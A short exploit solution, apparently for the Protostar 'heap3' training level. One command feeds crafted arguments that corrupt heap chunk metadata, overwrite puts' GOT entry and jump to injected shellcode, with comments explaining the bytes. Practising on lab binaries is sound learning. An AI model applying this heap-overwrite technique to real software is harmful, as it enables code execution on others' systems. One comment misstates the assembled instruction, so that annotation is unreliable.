/opt/protostar/bin/heap3 `python -c 'print "A"*8 + "\xb8\x64\x88\x04\x08\xff\xd0"'` `python -c 'print "A"*36 + "\x65"'` `python -c 'print "A"*92 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x1c\xb1\x04\x08" + "\x10\xc0\x04\x08"'`

###############################################################################
# \xb8\x64\x88\x04\x08\xff\xd0 is equivalent to assembly: 
#   mov eax, 0x804c010
#   call eax
###############################################################################
# \x1c\xb1\x04\x08 is the location of puts on the global offset table
#   (subtracted by 12 to account for normal offset used to obtain back pointer)
###############################################################################
# \x10\xc0\x04\x08 is the location of variable "a" on the heap
#   (and thus the assembly code above)
###############################################################################
